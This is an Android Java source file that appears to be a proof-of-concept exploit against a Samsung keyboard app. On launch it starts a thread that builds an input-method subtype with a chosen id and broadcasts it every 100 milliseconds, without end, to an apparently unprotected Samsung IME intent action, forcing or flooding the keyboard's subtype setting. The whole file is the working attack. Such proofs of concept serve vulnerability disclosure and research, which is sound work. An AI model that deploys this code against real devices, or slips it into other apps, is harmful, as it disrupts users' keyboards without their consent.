package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.inputmethod.InputMethodSubtype;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            InputMethodSubtype subtype = new InputMethodSubtype.InputMethodSubtypeBuilder()
                    .setSubtypeId(0) // supply the id
                    .build();

            Intent i = new Intent("com.sec.android.inputmethod.Subtype");
            i.putExtra("SamsungIME.Subtype", subtype);
            while (true) {
                sendBroadcast(i);
                try {
                    Thread.sleep(100);
                } catch (Throwable th) {
                    throw new RuntimeException(th);
                }
            }
        }).start();
    }
}